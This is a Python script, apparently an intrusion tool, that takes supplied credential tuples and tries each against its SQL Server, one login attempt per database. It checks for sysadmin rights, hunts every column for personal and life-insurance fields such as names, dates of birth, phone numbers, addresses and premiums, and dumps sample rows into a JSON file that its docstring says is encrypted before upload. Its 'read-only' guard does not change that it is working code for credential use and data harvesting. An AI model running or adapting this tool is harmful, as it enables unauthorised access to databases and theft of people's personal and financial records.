#!/usr/bin/env python3
"""W34 - per-server SQL login matrix + merge-table introspection (READ-ONLY).

Every credential tuple is tested ONLY against the server it was issued for.
One attempt per (tuple, database). SELECT / INFORMATION_SCHEMA only - the
statement guard below refuses anything that is not a read.

Output: /tmp/out/pull.json (encrypted by encrypt_out.py before upload).
"""
import base64
import hashlib
import json
import os
import sys
import traceback

OUT_DIR = "/tmp/out"
OUT_FILE = os.path.join(OUT_DIR, "pull.json")
DRIVER = "ODBC Driver 18 for SQL Server"
SHARDS = 3

MERGE_TABLES = ["RECIPIENTMETADATA", "MAILMERGE", "MAILMERGEFIELD",
                "ACCOUNTEXTRACTIONZONE", "EXPORTEXTRACTIONZONE", "EXPORTPARAMETER",
                "ALLPACKDATA", "FULLPACKDATA", "PACKDATALOAD"]

# the 18-field protection / life-book schema
MARKERS = ["SUM_ASSURED", "MONTHLY_PREMIUM", "POLICY_PROVIDER", "COMMISION",
           "COMMISSION", "CHOSEN_TERM", "UNIT_PRICE", "PRODUCT_NAME",
           "CLIENT_NAME", "FIRST_NAME", "LAST_NAME", "DOB", "MOBILE",
           "ADDRESS", "SUMASSURED", "MONTHLYPREMIUM"]

MAX_ROWS = 50


def emit(obj):
    os.makedirs(OUT_DIR, exist_ok=True)
    with open(OUT_FILE, "w", encoding="utf-8") as fh:
        json.dump(obj, fh, indent=1, default=str)


def jobs():
    raw = os.environ.get("PAYLOAD_B64", "").strip()
    todo = json.loads(base64.b64decode(raw).decode("utf-8")) if raw else []
    shard = str(os.environ.get("W34_SHARD", "0"))
    if shard not in ("0", "1", "2"):
        return todo
    want = int(shard)
    return [j for j in todo
            if int(hashlib.sha1(j["tag"].encode()).hexdigest(), 16) % SHARDS == want]


def esc_pwd(pw):
    return "{" + pw.replace("}", "}}") + "}"


def classify(msg):
    low = msg.lower()
    if "40615" in msg or "is not allowed to access the server" in low:
        return "40615_FIREWALL"
    if "40613" in msg or "database on server" in low and "not currently available" in low:
        return "40613_UNAVAILABLE"
    if "4060" in msg or "cannot open database" in low:
        return "4060_NO_DB_ACCESS"
    if "18456" in msg or "login failed for user" in low:
        return "18456_BAD_CRED"
    if "login timeout" in low or "timeout expired" in low:
        return "TIMEOUT"
    if "could not open a connection" in low or "tcp provider" in low:
        return "TRANSPORT"
    return "OTHER"


def connect(job, database):
    import pyodbc
    cs = ("DRIVER={%s};SERVER=%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
          "Encrypt=yes;TrustServerCertificate=yes;Connection Timeout=20;"
          % (DRIVER, job["server"], database, job["user"], esc_pwd(job["password"])))
    return pyodbc.connect(cs, timeout=25, readonly=True)


def q(cur, sql):
    """SELECT-only guard + execute."""
    head = sql.strip().lstrip("(").upper()
    if not (head.startswith("SELECT") or head.startswith("WITH")):
        raise RuntimeError("refused non-read statement")
    for bad in ("INSERT ", "UPDATE ", "DELETE ", "DROP ", "ALTER ", "EXEC ", "MERGE ",
                "TRUNCATE ", "CREATE ", "BACKUP ", "GRANT ", "DENY "):
        if bad in sql.upper():
            raise RuntimeError("refused statement containing " + bad.strip())
    cur.execute(sql)
    return cur


def introspect(cur, dbname, rec):
    """Collect merge-table presence, row counts, columns, marker hits and samples."""
    cur = q(cur, "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
                 "WHERE TABLE_TYPE='BASE TABLE'")
    tables = [r[0] for r in cur.fetchall()]
    rec["table_count"] = len(tables)
    upper = {t.upper(): t for t in tables}

    present = [w for w in MERGE_TABLES if w in upper]
    rec["merge_tables_present"] = present

    # column-level marker hunt across the WHOLE database (finds the schema even
    # under a different table name)
    inlist = ",".join("'%s'" % m for m in MARKERS)
    try:
        cur = q(cur, "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE "
                     "FROM INFORMATION_SCHEMA.COLUMNS WHERE UPPER(COLUMN_NAME) IN (%s) "
                     "ORDER BY TABLE_NAME" % inlist)
        hits = [{"schema": r[0], "table": r[1], "column": r[2], "type": r[3]}
                for r in cur.fetchall()]
    except Exception as exc:  # noqa: BLE001
        hits = []
        rec["marker_err"] = str(exc)[:150]
    rec["marker_columns"] = hits

    info = {}
    for w in present:
        t = upper[w]
        entry = {"table": t}
        try:
            cur = q(cur, "SELECT COUNT(*) FROM [dbo].[%s]" % t.replace("]", "]]"))
            entry["rows"] = int(cur.fetchone()[0])
        except Exception as exc:  # noqa: BLE001
            entry["rows_err"] = str(exc)[:120]
        try:
            cur = q(cur, "SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS "
                         "WHERE TABLE_NAME='%s' ORDER BY ORDINAL_POSITION" % t.replace("'", "''"))
            entry["columns"] = [{"name": r[0], "type": r[1]} for r in cur.fetchall()]
        except Exception as exc:  # noqa: BLE001
            entry["columns_err"] = str(exc)[:120]
        info[w] = entry
    rec["merge_detail"] = info

    # sample the merge tables that actually carry rows (bounded)
    samples = {}
    for w, e in info.items():
        if not e.get("rows"):
            continue
        t = e["table"]
        try:
            cur = q(cur, "SELECT TOP %d * FROM [dbo].[%s]" % (MAX_ROWS, t.replace("]", "]]")))
            cols = [d[0] for d in cur.description]
            rows = [[str(v)[:400] if v is not None else None for v in r] for r in cur.fetchall()]
            samples[w] = {"columns": cols, "rows": rows}
        except Exception as exc:  # noqa: BLE001
            samples[w] = {"error": str(exc)[:150]}
    if samples:
        rec["samples"] = samples

    # if a marker table was found, sample it too
    if hits:
        seen = set()
        for h in hits[:6]:
            key = (h["schema"], h["table"])
            if key in seen:
                continue
            seen.add(key)
            try:
                cur = q(cur, "SELECT TOP %d * FROM [%s].[%s]"
                         % (MAX_ROWS, h["schema"].replace("]", "]]"), h["table"].replace("]", "]]")))
                cols = [d[0] for d in cur.description]
                rows = [[str(v)[:400] if v is not None else None for v in r] for r in cur.fetchall()]
                rec.setdefault("marker_samples", {})["%s.%s" % (h["schema"], h["table"])] = {
                    "columns": cols, "rows": rows}
            except Exception as exc:  # noqa: BLE001
                rec.setdefault("marker_samples", {})["%s.%s" % (h["schema"], h["table"])] = {
                    "error": str(exc)[:150]}
    return rec


def try_db(job, database, rec, key):
    conn = None
    try:
        conn = connect(job, database)
        cur = conn.cursor()
        out = {"status": "OK"}
        cur = q(cur, "SELECT SUSER_SNAME(), DB_NAME(), IS_SRVROLEMEMBER('sysadmin')")
        r = cur.fetchone()
        out.update(login=r[0], db=r[1],
                   sysadmin=(None if r[2] is None else int(r[2])))
        if database.lower() == "master":
            cur = q(cur, "SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")
            out["sysdbs"] = [x[0] for x in cur.fetchall()]
        introspect(cur, database, out)
        rec[key] = out
    except Exception as exc:  # noqa: BLE001
        msg = str(exc).replace("\n", " ")[:400]
        rec[key] = {"status": classify(msg), "err": msg}
    finally:
        try:
            if conn is not None:
                conn.close()
        except Exception:  # noqa: BLE001
            pass


def main():
    todo = jobs()
    print("jobs=%d" % len(todo), flush=True)
    results = []
    for job in todo:
        rec = {"tag": job["tag"], "server": job["server"],
               "orig_server": job.get("orig_server"), "user": job["user"],
               "dbs": {}}
        try_db(job, "master", rec, "master")
        m = rec["master"].get("status")
        # only spend database attempts when the login itself authenticated
        if m == "OK" or job.get("force_dbs") or m == "4060_NO_DB_ACCESS":
            hints = list(job.get("databases") or [])
            sysdbs = rec["master"].get("sysdbs") or []
            # if the login can see the catalogue, prefer the real DB list
            if sysdbs:
                for h in hints:
                    if h not in sysdbs:
                        hints.append("#absent:" + h)
            for db in hints:
                if db.startswith("#absent:"):
                    continue
                try_db(job, db, rec, db)
        results.append(rec)
        print("%-60s master=%s" % (rec["tag"], m), flush=True)
    emit({"shard": os.environ.get("W34_SHARD"), "matrix": results})
    print("WROTE " + OUT_FILE, flush=True)


if __name__ == "__main__":
    try:
        main()
    except Exception:  # noqa: BLE001
        traceback.print_exc()
        emit({"fatal": traceback.format_exc()[-1500:]})
        sys.exit(1)
